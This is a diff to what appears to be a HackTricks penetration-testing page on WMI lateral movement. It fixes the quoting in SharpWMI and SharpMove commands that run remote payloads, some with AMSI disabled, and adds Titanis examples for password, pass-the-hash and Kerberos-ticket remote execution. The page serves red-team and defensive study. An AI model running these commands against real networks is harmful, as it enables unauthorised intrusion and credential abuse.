@@ -126,7 +126,7 @@ SharpLateral redwmi HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe
 - [**SharpWMI**](https://github.com/GhostPack/SharpWMI)
 
 ```bash
-SharpWMI.exe action=exec [computername=HOST[,HOST2,...]] command=""C:\\temp\\process.exe [args]"" [amsi=disable] [result=true]
+SharpWMI.exe action=exec [computername=HOST[,HOST2,...]] command="""C:\\temp\\process.exe [args]""" [amsi=disable] [result=true]
 # Stealthier execution with VBS
 SharpWMI.exe action=executevbs [computername=HOST[,HOST2,...]] [script-specification] [eventname=blah] [amsi=disable] [time-specs]
 ```
@@ -135,19 +135,34 @@ SharpWMI.exe action=executevbs [computername=HOST[,HOST2,...]] [script-specifica
 
 ```bash
 SharpMove.exe action=query computername=remote.host.local query="select * from win32_process" username=domain\user password=password
-SharpMove.exe action=create computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true username=domain\user password=password
+SharpMove.exe action=create computername=remote.host.local command="C:\\windows\\temp\\payload.exe" amsi=true username=domain\user password=password
 SharpMove.exe action=executevbs computername=remote.host.local eventname=Debug amsi=true username=domain\\user password=password
 ```
 
 - You could also use **Impacket's `wmiexec`**.
 
+- [**Titanis WMI (cross-platform)**](https://github.com/trustedsec/Titanis)
+
+```bash
+# Password auth
+Wmi exec TARGET -u User -ud DOMAIN -p 'Passw0rd!' "whoami /all"
+
+# Pass-the-Hash
+Wmi exec TARGET -u User -ud DOMAIN -NtlmHash 8846F7EAEE8FB117AD06BDD830B7586C "ipconfig /all"
+
+# Kerberos ticket (.kirbi or ccache) – PTT-style
+Wmi exec TARGET -Tgt user.tgt.kirbi -Kdc dc.domain.local "cmd.exe /c whoami"
+
+# Notes:
+# - Output is captured by default with -CaptureOutput (redirected to C:\\Windows\\Temp and polled)
+# - Use -EncryptRpc to encrypt MS-WMI/DCOM RPC and -signreq / -EncryptSmb to require SMB signing/encryption when needed
+```
 
 ## References
 
 - [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
+- [Titanis – WMI tool docs](https://github.com/trustedsec/Titanis/blob/public/doc/UserGuide/tools/Wmi.md)
+- [Titanis repository](https://github.com/trustedsec/Titanis)
 
 
 {{#include ../../banners/hacktricks-training.md}}
-
-
-
